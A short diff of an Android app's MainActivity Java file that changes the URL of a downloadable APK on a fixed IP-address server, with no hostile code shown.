@@ -27,7 +27,7 @@ public class MainActivity extends AppCompatActivity implements OnClickListener {
 
     SharedPreferences sp;
     String lastModified;
-    String modifiedFile = "http://185.25.119.3/taxoid/shara.apk";
+    String modifiedFile = "http://185.25.119.3/shara.apk";
     String scripts_host = "http://185.25.119.3/taxoid/";
 
     final String SYSTEM = "system";
